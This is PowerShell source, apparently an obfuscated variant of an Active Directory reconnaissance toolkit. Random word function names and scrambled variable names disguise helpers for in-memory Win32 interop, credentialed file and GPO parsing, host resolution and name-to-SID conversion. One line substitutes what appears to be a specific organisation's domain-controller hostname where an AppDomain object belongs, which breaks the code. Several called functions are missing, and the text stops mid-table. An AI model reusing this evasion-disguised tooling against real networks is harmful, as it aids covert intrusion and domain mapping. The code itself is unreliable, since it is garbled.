function orthographies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $DKYoQtQQ99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $hrOwhVkn99 = $DKYoQtQQ99.GetAssemblies()
    foreach ($RPDsYyDH99 in $hrOwhVkn99) {
        if ($RPDsYyDH99.FullName -and ($RPDsYyDH99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $RPDsYyDH99
        }
    }
    $OecLtxgU99 = New-Object Reflection.AssemblyName($ModuleName)
    $jeGdZvYa99 = "DYN01VTDC10.dynacare.ca"
    $QXbQElnh99 = $jeGdZvYa99.DefineDynamicAssembly($OecLtxgU99, 'Run')
    $WLrgFrSd99 = $QXbQElnh99.DefineDynamicModule($ModuleName, $False)
    return $WLrgFrSd99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $spToNsId99,
        [Switch]
        $SetLastError
    )
    $PvRupVWt99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $PvRupVWt99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $PvRupVWt99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $PvRupVWt99['Charset'] = $Charset }
    if ($SetLastError) { $PvRupVWt99['SetLastError'] = $SetLastError }
    if ($spToNsId99) { $PvRupVWt99['EntryPoint'] = $spToNsId99 }
    New-Object PSObject -Property $PvRupVWt99
}
function Maude
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $spToNsId99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $dEwxHbEu99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $dEwxHbEu99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $dEwxHbEu99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$dEwxHbEu99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $dEwxHbEu99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $dEwxHbEu99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $GxydJySm99 = $dEwxHbEu99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($sLWilxlS99 in $ParameterTypes)
            {
                if ($sLWilxlS99.IsByRef)
                {
                    [void] $GxydJySm99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $PCCuJnau99 = [Runtime.InteropServices.DllImportAttribute]
            $PovMfkOp99 = $PCCuJnau99.GetField('SetLastError')
            $KatYRUeQ99 = $PCCuJnau99.GetField('CallingConvention')
            $uPhKzICH99 = $PCCuJnau99.GetField('CharSet')
            $SMLrFhiq99 = $PCCuJnau99.GetField('EntryPoint')
            if ($SetLastError) { $UQkQhijx99 = $True } else { $UQkQhijx99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $NEhzQNyR99 = $spToNsId99 } else { $NEhzQNyR99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $GMBnBkIE99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($PovMfkOp99,
                                           $KatYRUeQ99,
                                           $uPhKzICH99,
                                           $SMLrFhiq99),
                [Object[]] @($UQkQhijx99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $NEhzQNyR99))
            $GxydJySm99.SetCustomAttribute($GMBnBkIE99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $dEwxHbEu99
        }
        $OLMEEhnK99 = @{}
        foreach ($Key in $dEwxHbEu99.Keys)
        {
            $Type = $dEwxHbEu99[$Key].CreateType()
            $OLMEEhnK99[$Key] = $Type
        }
        return $OLMEEhnK99
    }
}
function umbilicus {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $NYGuFZpg99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $iMTQGJxu99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($NYGuFZpg99))
    }
    $zfjFHSIG99 = $Type -as [Type]
    $OQXUuSQa99 = $Module.DefineEnum($NYGuFZpg99, 'Public', $zfjFHSIG99)
    if ($Bitfield)
    {
        $xPhHncef99 = [FlagsAttribute].GetConstructor(@())
        $MFXEhJKu99 = New-Object Reflection.Emit.CustomAttributeBuilder($xPhHncef99, @())
        $OQXUuSQa99.SetCustomAttribute($MFXEhJKu99)
    }
    foreach ($Key in $iMTQGJxu99.Keys)
    {
        $null = $OQXUuSQa99.DefineLiteral($Key, $iMTQGJxu99[$Key] -as $zfjFHSIG99)
    }
    $OQXUuSQa99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $rpxZRBWs99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $FXdWquQC99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $rpxZRBWs99
        Type = $Type -as [Type]
        Offset = $FXdWquQC99
        MarshalAs = $MarshalAs
    }
}
function twiddled
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $NYGuFZpg99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $VuwGqAXe99,
        [Reflection.Emit.PackingSize]
        $FktFAXJt99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $mbYHtHHc99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($NYGuFZpg99))
    }
    [Reflection.TypeAttributes] $kUsoBhqf99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($mbYHtHHc99)
    {
        $kUsoBhqf99 = $kUsoBhqf99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $kUsoBhqf99 = $kUsoBhqf99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $wfhjyBQE99 = $Module.DefineType($NYGuFZpg99, $kUsoBhqf99, [ValueType], $FktFAXJt99)
    $omqlZdcE99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $fWDFQxmy99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $wUpcHkhH99 = New-Object Hashtable[]($VuwGqAXe99.Count)
    foreach ($Field in $VuwGqAXe99.Keys)
    {
        $Index = $VuwGqAXe99[$Field]['Position']
        $wUpcHkhH99[$Index] = @{FieldName = $Field; Properties = $VuwGqAXe99[$Field]}
    }
    foreach ($Field in $wUpcHkhH99)
    {
        $AkQFuxVe99 = $Field['FieldName']
        $sEakEEJC99 = $Field['Properties']
        $FXdWquQC99 = $sEakEEJC99['Offset']
        $Type = $sEakEEJC99['Type']
        $MarshalAs = $sEakEEJC99['MarshalAs']
        $XsgkheTk99 = $wfhjyBQE99.DefineField($AkQFuxVe99, $Type, 'Public')
        if ($MarshalAs)
        {
            $MbIqLgWP99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $LXjpbgkt99 = New-Object Reflection.Emit.CustomAttributeBuilder($omqlZdcE99,
                    $MbIqLgWP99, $fWDFQxmy99, @($Size))
            }
            else
            {
                $LXjpbgkt99 = New-Object Reflection.Emit.CustomAttributeBuilder($omqlZdcE99, [Object[]] @($MbIqLgWP99))
            }
            $XsgkheTk99.SetCustomAttribute($LXjpbgkt99)
        }
        if ($mbYHtHHc99) { $XsgkheTk99.SetOffset($FXdWquQC99) }
    }
    $sVkEafpG99 = $wfhjyBQE99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $qZCQZpKz99 = $sVkEafpG99.GetILGenerator()
    $qZCQZpKz99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $wfhjyBQE99)
    $qZCQZpKz99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $qZCQZpKz99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $qZCQZpKz99.Emit([Reflection.Emit.OpCodes]::Ret)
    $UaAmtjiy99 = $wfhjyBQE99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $wfhjyBQE99,
        [Type[]] @([IntPtr]))
    $iMQGuXKl99 = $UaAmtjiy99.GetILGenerator()
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Nop)
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $wfhjyBQE99)
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $wfhjyBQE99)
    $iMQGuXKl99.Emit([Reflection.Emit.OpCodes]::Ret)
    $wfhjyBQE99.CreateType()
}
Function rapscallions {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$TxhGKqUx99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$rpxZRBWs99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$cZbrnrAc99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$XTZsQYDy99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$sRCYsUYE99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$toWtHuJW99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$gHTTZTuX99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$QIKCiaCt99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$VjuQuDwQ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$KGydSoLG99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$SeOvUmpQ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AEGmRSmM99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cFMxvQRe99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$oHsuRXfa99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$wrPbIDMi99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$csYDngqi99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$yxTFaesN99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$GMdLryBz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$zFsLSBhf99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $OdwzAFTG99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$eDOaPEtH99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $MIeirkyG99
    )
    Begin {
        $pcgTeicf99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $JqAbBZPf99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($eDOaPEtH99) {
            $lvkAmcpk99 = $MIeirkyG99.Keys | Where-Object { $JqAbBZPf99 -notcontains $_ }
            ForEach($sLWilxlS99 in $lvkAmcpk99) {
                if ($sLWilxlS99) {
                    Set-Variable -Name $sLWilxlS99 -Value $MIeirkyG99.$sLWilxlS99 -Scope 1 -Force
                }
            }
        }
        else {
            $vuPPStJg99 = @()
            $vuPPStJg99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($vuPPStJg99) {
                $vuPPStJg99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $TPRwRiAD99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($sLWilxlS99 in $TPRwRiAD99) {
                $hQDzcKKJ99 = Get-Variable -Name $sLWilxlS99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($sLWilxlS99, [ref]$tmp) -and $hQDzcKKJ99) {
                    $PSBoundParameters.$sLWilxlS99 = $hQDzcKKJ99
                }
            }
            if($OdwzAFTG99) {
                $jwLXjGiW99 = $OdwzAFTG99
            }
            else {
                $jwLXjGiW99 = $pcgTeicf99
            }
            $gjMqAlPP99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $PcpsvXtk99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ykKZZfTP99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $CTEvVzjY99 = '^Alias$'
            $iuAfBnnn99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $PcpsvXtk99 {
                    Try {
                        $iuAfBnnn99.$_ = . $gjMqAlPP99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($jwLXjGiW99.Keys -contains $Name) {
                $jwLXjGiW99.$Name.Attributes.Add($iuAfBnnn99)
            }
            else {
                $dhbTEUEL99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ykKZZfTP99 {
                        Try {
                            $FqVfaEXa99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $gjMqAlPP99) -ErrorAction Stop
                            $dhbTEUEL99.Add($FqVfaEXa99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $CTEvVzjY99 {
                        Try {
                            $CwLipdHx99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $gjMqAlPP99) -ErrorAction Stop
                            $dhbTEUEL99.Add($CwLipdHx99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $dhbTEUEL99.Add($iuAfBnnn99)
                $sLWilxlS99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $dhbTEUEL99)
                $jwLXjGiW99.Add($Name, $sLWilxlS99)
            }
        }
    }
    End {
        if(!$eDOaPEtH99 -and !$OdwzAFTG99) {
            $jwLXjGiW99
        }
    }
}
function lubricate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $iYgKbvhJ99
    )
    BEGIN {
        $gnbmJgNr99 = @{}
    }
    PROCESS {
        ForEach ($mLpzMLwf99 in $Path) {
            if (($mLpzMLwf99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $QpWiCdMP99 = (New-Object System.Uri($mLpzMLwf99)).Host
                if (-not $gnbmJgNr99[$QpWiCdMP99]) {
                    demilitarized -kyzUdCPm99 $QpWiCdMP99 -DOZPHpup99 $DOZPHpup99
                    $gnbmJgNr99[$QpWiCdMP99] = $True
                }
            }
            if (Test-Path -Path $mLpzMLwf99) {
                if ($PSBoundParameters['OutputObject']) {
                    $uPIBBAcu99 = New-Object PSObject
                }
                else {
                    $uPIBBAcu99 = @{}
                }
                Switch -Regex -File $mLpzMLwf99 {
                    "^\[(.+)\]" # Section
                    {
                        $rjMESMAW99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $rjMESMAW99 = $rjMESMAW99.Replace(' ', '')
                            $DvqpPClv99 = New-Object PSObject
                            $uPIBBAcu99 | Add-Member Noteproperty $rjMESMAW99 $DvqpPClv99
                        }
                        else {
                            $uPIBBAcu99[$rjMESMAW99] = @{}
                        }
                        $mLrIlQNx99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $mLrIlQNx99 = $mLrIlQNx99 + 1
                        $Name = 'Comment' + $mLrIlQNx99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $uPIBBAcu99.$rjMESMAW99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $uPIBBAcu99[$rjMESMAW99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $TVUxCBhN99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $uPIBBAcu99.$rjMESMAW99 | Add-Member Noteproperty $Name $TVUxCBhN99
                        }
                        else {
                            $uPIBBAcu99[$rjMESMAW99][$Name] = $TVUxCBhN99
                        }
                    }
                }
                $uPIBBAcu99
            }
        }
    }
    END {
        $gnbmJgNr99.Keys | calibrating
    }
}
function clumsily {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $kZBXgWDy99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $emqIxkTF99 = ',',
        [Switch]
        $ntpKBDMs99
    )
    BEGIN {
        $KkETHWzX99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $cMEFmdwt99 = [System.IO.File]::Exists($KkETHWzX99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $ERZOGltC99 = [System.IO.FileMode]::Append
        }
        else {
            $ERZOGltC99 = [System.IO.FileMode]::Create
            $cMEFmdwt99 = $False
        }
        $UDaxopOd99 = New-Object IO.FileStream($KkETHWzX99, $ERZOGltC99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $fiMuDkSD99 = New-Object System.IO.StreamWriter($UDaxopOd99)
        $fiMuDkSD99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $kZBXgWDy99) {
            $fIyzUANx99 = ConvertTo-Csv -kZBXgWDy99 $Entry -emqIxkTF99 $emqIxkTF99 -NoTypeInformation
            if (-not $cMEFmdwt99) {
                $fIyzUANx99 | ForEach-Object { $fiMuDkSD99.WriteLine($_) }
                $cMEFmdwt99 = $True
            }
            else {
                $fIyzUANx99[1..($fIyzUANx99.Length-1)] | ForEach-Object { $fiMuDkSD99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $fiMuDkSD99.Dispose()
        $UDaxopOd99.Dispose()
    }
}
function glares {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            try {
                @(([Net.Dns]::GetHostEntry($GucPfsvo99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[glares] Could not resolve $GucPfsvo99 to an IP Address."
            }
        }
    }
}
function Ptolemy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $tFiqSWVt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $dEAMrxro99 = @{}
        if ($PSBoundParameters['Domain']) { $dEAMrxro99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $dEAMrxro99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Credential']) { $dEAMrxro99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        ForEach ($Object in $tFiqSWVt99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = intrenches -fqOhNdkk99 $Object -vxxrLejt99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $BUwbCXsa99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $rYdFULpQ99 = $DN.Split(',')[0].split('=')[1]
                    $dEAMrxro99['Identity'] = $rYdFULpQ99
                    $dEAMrxro99['Domain'] = $BUwbCXsa99
                    $dEAMrxro99['Properties'] = 'objectsid'
                    cupped @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $jeGdZvYa99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $dEAMrxro99 = @{}
                        $jeGdZvYa99 = (Herodotus @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($jeGdZvYa99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[Ptolemy] Error converting $jeGdZvYa99\$Object : $_"
                }
            }
        }
    }
}
function bandaging {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $aDsLribc99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $WYZNomjg99 = @{}
        if ($PSBoundParameters['Domain']) { $WYZNomjg99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $WYZNomjg99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Credential']) { $WYZNomjg99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        ForEach ($nmAqQmMs99 in $aDsLribc99) {
            $nmAqQmMs99 = $nmAqQmMs99.trim('*')
            try {
                Switch ($nmAqQmMs99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
